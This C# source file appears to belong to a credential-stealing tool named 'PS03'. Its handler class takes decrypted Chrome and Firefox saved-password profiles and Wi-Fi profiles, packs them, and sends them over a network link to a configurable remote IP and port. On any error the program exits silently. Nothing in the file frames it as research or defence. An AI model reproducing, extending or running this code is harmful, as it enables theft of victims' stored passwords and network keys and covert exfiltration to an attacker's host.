using System;
using System.Collections.Generic;
using PS03.Network.Receive.Handlers;
using PS03.Network.Transmit;
using PS03.PasswordOps.ChromeDecrypt;
using PS03.PasswordOps.FirefoxDecrypt.Models;
using PS03.PasswordOps.WiPS.Models;

namespace PS03.PasswordOps
{
    public class Eventhandlers
    {
        private readonly ChromePacker cpack = new ChromePacker();
        private readonly FirefoxPakcer fpack = new FirefoxPakcer();
        private readonly WifiPacker wpack = new WifiPacker();
        private bool transmit;
        private bool verbose;
        public RTransLink rtl;

        public Eventhandlers(string ip, int port, bool transmit, bool verbose)
        {
            this.transmit = transmit;
            this.verbose = verbose;
            rtl = new RTransLink(ip, port);
        }
        public void HandleWiFiProfileReady(List<Profile> profiles)
        {
            foreach (var profile in profiles)
            {
                try
                {
                    if(transmit)
                        rtl.Send(wpack.Pack(profile,true));
                    if (verbose)
                    {
                        var handler = new WifiHandler();
                        handler.Handle(wpack.Pack(profile,false));
                    }
                }
                catch (Exception)
                {
                    Environment.Exit(0);
                }
            }
        }

        public void HandleChromeDataReady(List<CPProfile> profiles)
        {
            foreach (var profile in profiles)
            {
                try
                {
                    if(transmit)
                        rtl.Send(cpack.Pack(profile,true));
                    if(verbose)
                    {
                        var handler = new ChromeHandler();
                        handler.Handle(cpack.Pack(profile,false));
                    }
                }
                catch (Exception)
                {
                    Environment.Exit(0);
                }
            }
        }


        public void HandleFirefoxDataReady(List<FFData> profiles)
        {
            foreach (var profile in profiles)
            {
                try
                {
                    if(transmit)
                        rtl.Send(fpack.Pack(profile,true));
                    if (verbose)
                    {
                        var handler = new FirefoxHandler();
                        handler.Handle(fpack.Pack(profile,false));
                    }
                }
                catch (Exception)
                {
                    Environment.Exit(0);
                }
            }
        }
    }
}